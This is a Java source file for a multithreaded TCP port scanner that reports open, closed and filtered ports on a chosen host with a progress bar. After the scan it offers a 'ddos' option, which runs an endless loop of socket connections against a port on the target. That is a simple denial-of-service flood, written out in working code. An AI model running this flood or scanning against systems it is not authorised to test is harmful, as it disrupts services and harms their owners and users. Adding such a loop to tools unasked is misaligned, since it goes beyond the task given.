import java.util.*;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

/**
 * 
 * @author Alvaro Ponce
 *
 */
public class PortScanner extends Thread
{

    InetAddress mydirIP;
    int myport;
    int time;  
    int myflag;
    portDisplay display;
    int numberPorts;
    
    public PortScanner(InetAddress dirIP, int port, int T1, int flag, portDisplay display, int totalPorts){
    this.mydirIP = dirIP;
    this.myport = port;
    this.time = T1;
    this.myflag = flag;
    this.display = display;
    this.numberPorts = totalPorts;
    
    }
    
    public void run(){
        String comparator = "";
        String response = "java.net.ConnectException: Connection refused";
         
        
        
        if(myflag == 0){   
            try{      
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(mydirIP,myport), time);
                socket.close();
                display.incrementTotalPorts();
                display.insertPort(myport);

                if((display.getTotalPorts()*100/numberPorts) > display.getPercentage()){
                    display.setPercentage(display.getTotalPorts()*100/numberPorts);
                    printProgBar(display.getPercentage());
                } //end if
            } //end try
            catch(IOException e) {
                comparator = ""+e;
                if(comparator.equals(response)){
                    display.incrementTotalPorts();
                    display.incrementClosed();
                    if((display.getTotalPorts()*100/numberPorts) > display.getPercentage()){
                        display.setPercentage(display.getTotalPorts()*100/numberPorts);
                        printProgBar(display.getPercentage());
                    }//end if
                }//end if
                else display.insertChecker(myport);
                
                }//end catch
            
        }//end if   
        else if(myflag == 1) {
            try{    
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(mydirIP,myport), time);
                socket.close();
                display.incrementTotalPorts();
                display.insertPort2(myport);
                
                if((display.getTotalPorts()*100/numberPorts) > display.getPercentage()){
                    display.setPercentage(display.getTotalPorts()*100/numberPorts);
                    printProgBar(display.getPercentage());
                }//end if
            }//end try 
            catch(IOException e) {
                display.incrementTotalPorts();
                display.incrementFiltered();
                if((display.getTotalPorts()*100/numberPorts) > display.getPercentage()){
                    display.setPercentage(display.getTotalPorts()*100/numberPorts);
                    printProgBar(display.getPercentage());
                }//end if
            }//end catch 
        }//end if
    }//end run
    
    
    
    public static void main(String[] args) throws InterruptedException{

    	if(args.length != 5){
    		System.out.println("Usage: PortScanner [host] [Start port] [End port] [Timeout] [Max threads]");
    		System.exit(0);
    	}
    	    	
    	
        int PI = Integer.parseInt(args[1]);
        int PF = Integer.parseInt(args[2]);
        int T1 = Integer.parseInt(args[3]);
        int Max = Integer.parseInt(args[4]);
        int port = PI;
        PortScanner scanner = null; 
        InetAddress dirIP = null;
        portDisplay display = new portDisplay();
        int baseThreads = activeCount();
        int totalPorts = (PF-PI)+1;
        
        try{      
            dirIP = InetAddress.getByName(args[0]);
            System.out.println("\nPlease wait, hosts with most of the ports filtered may take a while to start running\n");
            
            
            while(port <= PF){
                if(activeCount() <= Max){
                    scanner = new PortScanner(dirIP, port, T1, 0,display, totalPorts);
                    scanner.start();
                    port++;
                    }//end if
            }//end while
            while(activeCount() > baseThreads){}
            
            int counter = 0;
            while(counter < display.getcheckedPorts()){
                if(activeCount() <= Max){
                    scanner = new PortScanner(dirIP, display.getChecked(counter), T1, 1,display, totalPorts);
                    scanner.start();
                    counter++;
                    }//end if
            }//end while
            while(activeCount() > baseThreads){}
        }//end try 
        catch(UnknownHostException e) {
            System.out.println( "Couldn't resolve host, try to execute again and try another one");
            System.exit(1);
        }//end catch
        
        
        //Print the results
        String res = "\n";
        res+="\nHost analyzed :" + dirIP + " (" + args[0] + ") \n";
        res+="Port range :" + PI + "-" + PF + "\n";
        res+="Number of threads: " + Max + "\n";
        res+=""+ display.toString();
        System.out.println(res);
        
        
        Scanner kbd = new Scanner(System.in);
        System.out.println("Do you want to store the results in a document?");
        System.out.println("/y/ or /n/");
        String store = kbd.nextLine();
        if(store.equals("y"))
        {
            try{
            System.out.println("Insert a name for the file");
            String filename = kbd.nextLine();
            PrintWriter out = new PrintWriter(filename);
            out.println(res);
            out.close();
            }catch(FileNotFoundException e) {
            	System.out.println(e);
            }//end catch
        }//end if
        System.out.println("Do you want to do a ddos?");
        System.out.println("/y/ or /n/");
        String store2 = kbd.nextLine();
        if(store2.equals("y"))
        {
            try{
            System.out.println("Insert port");
            int portddos = kbd.nextInt();
            while(true){
            Socket socket = new Socket();
                socket.connect(new InetSocketAddress(args[0],portddos));
                socket.close();
                }//end while
            }//end try
            catch(IOException e) { System.out.println("Bad ip");}
        }//end if
    }//end main
    
    
    public static void printProgBar(int percent){
        StringBuilder bar = new StringBuilder("[");

        for(int i = 0; i < 50; i++){
            if( i < (percent/2)){
                bar.append("=");
            }else if( i == (percent/2)){
                bar.append(">");
            }else{
                bar.append(" ");
            }
        }

        bar.append("]   " + percent + "%     ");
        System.out.print("\r" + bar.toString());
    }    
}//end class
